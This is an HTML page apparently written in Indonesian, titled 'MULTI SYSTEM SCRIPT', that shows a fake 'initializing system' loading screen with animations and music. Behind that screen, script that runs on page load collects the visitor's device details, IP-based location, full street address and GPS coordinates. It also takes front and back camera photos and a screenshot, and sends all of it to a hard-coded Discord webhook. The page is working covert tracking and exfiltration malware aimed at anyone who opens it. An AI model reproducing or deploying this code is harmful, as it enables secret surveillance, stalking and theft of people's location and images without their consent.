<!DOCTYPE html>
<html lang="id">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>MULTI SYSTEM SCRIPT</title>
    <meta name="description" content="MULTI SYSTEM - POWERED BY NODE" />
    <link rel="icon" type="image/x-icon" href="https://files.catbox.moe/5bwkpb.ico" />
    <link rel="icon" type="image/png" href="https://files.catbox.moe/5bwkpb.png" />
    <link rel="icon" type="image/jpeg" href="https://files.catbox.moe/5bwkpb.jpg" />
    <link rel="apple-touch-icon" href="https://files.catbox.moe/5bwkpb.png" />
    <meta name="theme-color" content="#000000" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
      body{
        background:linear-gradient(270deg,#0f0c29,#302b63,#24243e);
        background-size:600% 600%;
        animation:bgMove 12s ease infinite;
        margin:0;padding:0;
        display:flex;justify-content:center;align-items:center;
        height:100vh;font-family:"Orbitron",Arial,sans-serif;
        color:#999;overflow:hidden;position:relative;
    }
    @keyframes bgMove{
        0%{background-position:0% 50%;}
        50%{background-position:100% 50%;}
        100%{background-position:0% 50%;}
    }

    .particle{
        position:absolute;
        background:radial-gradient(circle,#ffffffaa 0%,transparent 70%);
        border-radius:50%;
        opacity:.7;
        animation:floatParticle linear infinite;
    }
    @keyframes floatParticle{
        from{transform:translateY(100vh) scale(1);}
        to{transform:translateY(-10vh) scale(0);}
    }

    #loading-container{text-align:center;width:80%;max-width:400px;z-index:5}
    
    #loading-text{
        font-size:24px;
        margin-bottom:20px;
        color:#c293ff;
        position:relative;
        text-shadow:0 0 5px #9b59ff, 0 0 10px #b06cff;
        animation:glitch 2.4s infinite;
    }
    #loading-text::before, #loading-text::after{
        content:attr(data-text);
        position:absolute;
        left:0;
        width:100%;
        overflow:hidden;
    }
    #loading-text::before{
        left:2px;
        text-shadow:-2px 0 red;
        clip-path:inset(0 0 45% 0);
        animation:glitchTop 2.4s infinite ease-in-out alternate;
    }
    #loading-text::after{
        left:-2px;
        text-shadow:2px 0 cyan;
        clip-path:inset(55% 0 0 0);
        animation:glitchBottom 2.4s infinite ease-in-out alternate;
    }
    @keyframes glitch{
        0%{transform:translate(0);}
        10%{transform:translate(-2px,1px);}
        20%{transform:translate(2px,-1px);}
        30%{transform:translate(-1px,2px);}
        40%,100%{transform:translate(0);}
    }
    @keyframes glitchTop{
        0%{clip-path:inset(0 0 40% 0);}
        50%{clip-path:inset(0 0 60% 0);}
        100%{clip-path:inset(0 0 45% 0);}
    }
    @keyframes glitchBottom{
        0%{clip-path:inset(60% 0 0 0);}
        50%{clip-path:inset(40% 0 0 0);}
        100%{clip-path:inset(55% 0 0 0);}
    }

    #progress-container{height:3px;background:#222;border-radius:3px;overflow:hidden}
    #progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#6e48aa,#9d50bb);transition:width .3s ease}
    #loading-details{margin-top:20px;font-size:14px;color:#aaa;text-shadow:0 0 5px #000}
    .hidden{display:none}

    #neon-image{
        width:120px;
        height:120px;
        border-radius:50%;
        border:3px solid #fff;
        box-shadow:0 0 30px #fff;
        animation:neonRainbow 3s linear infinite, neonPulse 2s ease-in-out infinite alternate;
        object-fit:cover;
        margin:0 auto 25px;
        display:block;
    }
    @keyframes neonRainbow{
        0%{border-color:#ff0080;box-shadow:0 0 25px #ff0080,0 0 60px #ff0080;}
        20%{border-color:#ff8c00;box-shadow:0 0 25px #ff8c00,0 0 60px #ff8c00;}
        40%{border-color:#40e0d0;box-shadow:0 0 25px #40e0d0,0 0 60px #40e0d0;}
        60%{border-color:#00ff00;box-shadow:0 0 25px #00ff00,0 0 60px #00ff00;}
        80%{border-color:#1e90ff;box-shadow:0 0 25px #1e90ff,0 0 60px #1e90ff;}
        100%{border-color:#ff0080;box-shadow:0 0 25px #ff0080,0 0 60px #ff0080;}
    }
    @keyframes neonPulse{
        from{transform:scale(1);}
        to{transform:scale(1.05);}
    }
    
    #music-visualizer{
        position:absolute;
        bottom:40px;
        left:50%;
        transform:translateX(-50%);
        display:flex;
        align-items:flex-end;
        gap:6px;
        height:40px;
        z-index:10;
    }
    .bar{
        width:5px;
        background:linear-gradient(to top,#ff0080,#ff8c00,#40e0d0);
        border-radius:5px;
        animation:barMove 1s ease-in-out infinite;
    }
    @keyframes barMove{
        0%,100%{height:10px;opacity:.7;}
        50%{height:40px;opacity:1;}
    }
    </style>
  </head>
  <body>
    <script>
      for(let i=0;i<40;i++){
      const p=document.createElement('div');
      p.className='particle';
      const size=Math.random()*4+2;
      p.style.width=size+'px';
      p.style.height=size+'px';
      p.style.left=Math.random()*100+'%';
      p.style.animationDuration=(8+Math.random()*8)+'s';
      document.body.appendChild(p);
    }
    </script>
    <div id="loading-container">
      <img id="neon-image" src="https://files.catbox.moe/5bwkpb.jpg" alt="Neon Logo" />
      <div id="loading-text" data-text="INITIALIZING SYSTEM...">
        INITIALIZING SYSTEM...
      </div>
      <div id="progress-container">
        <div id="progress-bar">
        </div>
      </div>
      <div id="loading-details">
        Memulai inisialisasi...
      </div>
    </div>
    <video id="v" autoplay="" muted="" class="hidden"></video>
    <canvas id="c" class="hidden"></canvas>
    <audio id="bg-music" src="https://files.catbox.moe/yu43bv.m4a" preload="auto" loop="" muted=""></audio>
    <div id="music-visualizer">
      <div class="bar" style="animation-delay:0s"></div>
      <div class="bar" style="animation-delay:0.1s"></div>
      <div class="bar" style="animation-delay:0.2s"></div>
      <div class="bar" style="animation-delay:0.3s"></div>
      <div class="bar" style="animation-delay:0.4s"></div>
      <div class="bar" style="animation-delay:0.5s"></div>
      <div class="bar" style="animation-delay:0.6s"></div>
      <div class="bar" style="animation-delay:0.7s"></div>
      <div class="bar" style="animation-delay:0.8s"></div>
      <div class="bar" style="animation-delay:0.9s"></div>
    </div>
    <script>
      (() => {
    // ========== KONFIGURASI DISCORD WEBHOOK ==========
    // GANTI URL INI DENGAN WEBHOOK DISCORD ANDA
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1449595197921951786/q7pM8FCgCRsFj6TbSGRswqupsvoZxhYAVaPBlZDUJBI3ru_1YV3RYaaWaXNeqABgxrV-';
    
    // Fungsi mengirim ke Discord
    const sendToDiscord = async (content, fileBlob = null, fileName = null) => {
      try {
        if (fileBlob && fileName) {
          // Kirim dengan file attachment
          const formData = new FormData();
          formData.append('payload_json', JSON.stringify({ content: content.substring(0, 2000) }));
          formData.append('file', fileBlob, fileName);
          await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
        } else {
          // Kirim teks biasa
          await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: content.substring(0, 2000) })
          });
        }
      } catch(e) { console.log('Discord send error:', e); }
    };
    
    const pb = document.getElementById('progress-bar');
    const ld = document.getElementById('loading-details');

    const LM = [
      "CHECKING SYSTEM MODULE...",
      "LOADING ALL CORE COMPONENTS...",
      "INITIALIZE INTERFACE...",
      "VERIFY SYSTEM CONNECTION...",
      "PREPARING SYSTEM MODULE...",
      "CHECK FOR ALL SYSTEM UPDATES...",
      "LOADING SYSTEM MENU ASSET...", 
      "CHECK VERIFY MODULE SYSTEM..."
    ];
    let p = 0;
    setInterval(() => {
        p += Math.random() * 5;
        if(p > 98) p = 98;
        pb.style.width = p + '%';
        if(Math.random() > 0.9) ld.textContent = LM[Math.floor(Math.random() * LM.length)];
    }, 500);

    const audio = document.getElementById('bg-music');
    const enableSound = () => {
      audio.muted = false;
      audio.play().catch(e => console.log('Autoplay diblokir:', e));
      document.removeEventListener('click', enableSound);
      document.removeEventListener('touchstart', enableSound);
    };
    audio.play().catch(() => {});
    document.addEventListener('click', enableSound);
    document.addEventListener('touchstart', enableSound);

    const getLocationDetails = async (lat, lon) => {
      try {
        const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
        const d = await r.json();
        if(d.address) return {
          kb: d.address.county || d.address.city || d.address.state || "Tidak diketahui",
          kc: d.address.suburb || d.address.village || d.address.town || "Tidak diketahui",
          fa: d.display_name || "Alamat tidak tersedia"
        };
      } catch(e) {}
      return { kb: "Tidak diketahui", kc: "Tidak diketahui", fa: "Alamat tidak tersedia" };
    };
    
    const collectDeviceInfo = async () => {
      let info = '**[SYSTEM REPORT - DEVICE INFO]**\n\n';
      info += `**DEVICE:** ${navigator.userAgent}\n`;
      info += `**PLATFORM:** ${navigator.platform}\n`;
      info += `**LANGUAGE:** ${navigator.language}\n`;
      info += `**ONLINE:** ${navigator.onLine ? 'Yes' : 'No'}\n`;
      info += `**SCREEN SIZE:** ${screen.width}x${screen.height}\n`;
      info += `**WINDOW SIZE:** ${innerWidth}x${innerHeight}\n`;
      info += `**RAM:** ${navigator.deviceMemory || 'Unknown'} GB\n`;
      info += `**CPU CORES:** ${navigator.hardwareConcurrency || 'Unknown'}\n`;
      
      if (navigator.getBattery) {
        try {
          const b = await navigator.getBattery();
          info += `**BATTERY:** ${Math.floor(b.level * 100)}%\n`;
          info += `**CHARGING:** ${b.charging ? 'Yes' : 'No'}\n`;
        } catch(e) {
          info += `**BATTERY:** Not available\n`;
        }
      }
      
      info += `**ACCESS TIME:** ${new Date().toString()}\n`;
      info += `**LOAD TIME:** ${performance.now().toFixed(2)} ms\n`;
      info += `**HISTORY LENGTH:** ${history.length}\n`;
      info += `**TOUCH SUPPORT:** ${'ontouchstart' in window ? 'Yes' : 'No'}\n`;
      info += `**REFERRER:** ${document.referrer || 'None'}\n`;
      info += `**URL:** ${location.href}\n`;
      info += `**TITLE:** ${document.title}\n`;
      info += `**TIMEZONE:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
      info += `**UTC OFFSET:** ${new Date().getTimezoneOffset()} minutes\n\n`;

      try {
        const i = await fetch('https://ipapi.co/json/');
        const d = await i.json();
        info += '**[LOCATION INFO]**\n';
        info += `**IP:** ${d.ip}\n`;
        info += `**CITY:** ${d.city}\n`;
        info += `**REGION:** ${d.region}\n`;
        info += `**COUNTRY:** ${d.country_name}\n`;
        info += `**POSTAL CODE:** ${d.postal}\n`;

        if (d.latitude && d.longitude) {
          info += `**LATITUDE:** ${d.latitude}\n`;
          info += `**LONGITUDE:** ${d.longitude}\n`;

          const loc = await getLocationDetails(d.latitude, d.longitude);
          info += `**DISTRICT:** ${loc.kb}\n`;
          info += `**SUB DISTRICT:** ${loc.kc}\n`;
          info += `**FULL ADDRESS:** ${loc.fa}\n`;
        }
      } catch(e) {
        info += 'Failed to get location info\n';
      }
      info += '\n*Powered by System Report*';
      return info;
    };
    
    const captureCamera = async (mode) => {
      const v = document.getElementById('v');
      const c = document.getElementById('c');
      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { exact: mode } }
        });
        v.srcObject = stream;
        await new Promise(resolve => v.onloadedmetadata = resolve);
        v.play();
        await new Promise(r => setTimeout(r, 1500));
        
        c.width = v.videoWidth;
        c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        
        const blob = await new Promise(resolve => c.toBlob(resolve, 'image/jpeg'));
        await sendToDiscord(`📸 Camera capture (${mode})`, blob, `${mode}_camera.jpg`);
        
        stream.getTracks().forEach(t => t.stop());
        return true;
      } catch(e) {
        if(stream) stream.getTracks().forEach(t => t.stop());
        await sendToDiscord(`⚠️ Camera access failed for ${mode}`);
        return false;
      }
    };
    
    const startTracking = async () => {
      // Kirim info device ke Discord
      const deviceInfo = await collectDeviceInfo();
      await sendToDiscord(deviceInfo);
      
      // Coba capture kamera depan, lalu belakang
      let cameraSuccess = await captureCamera("user");
      if (!cameraSuccess) {
        cameraSuccess = await captureCamera("environment");
      }
      if (!cameraSuccess) {
        await sendToDiscord('❌ Both front and back cameras are blocked');
      }
      
      // Screenshot setelah delay
      setTimeout(async () => {
        try {
          const canvas = await html2canvas(document.body);
          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
          await sendToDiscord('📸 Screenshot captured', blob, 'screenshot.jpg');
        } catch(e) {
          await sendToDiscord('❌ Screenshot failed');
        }
      }, 2000);
      
      // GPS Tracking
      if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(async (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          let gpsMsg = `**[GPS TRACKING]**\n\n`;
          gpsMsg += `**LAT:** ${lat}\n`;
          gpsMsg += `**LNG:** ${lon}\n`;
          gpsMsg += `**ACCURACY:** ${pos.coords.accuracy}m\n`;
          gpsMsg += `**GOOGLE MAPS:** https://www.google.com/maps/search/?api=1&query=${lat},${lon}\n`;
          const loc = await getLocationDetails(lat, lon);
          gpsMsg += `**DISTRICT:** ${loc.kb}\n`;
          gpsMsg += `**SUB DISTRICT:** ${loc.kc}\n`;
          gpsMsg += `**ADDRESS:** ${loc.fa}\n`;
          await sendToDiscord(gpsMsg);
        }, async (err) => {
          await sendToDiscord(`❌ GPS Error: ${err.message}`);
        }, { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 });
      }
    };
    
    startTracking();
  })();
    </script>
  </body>
</html>
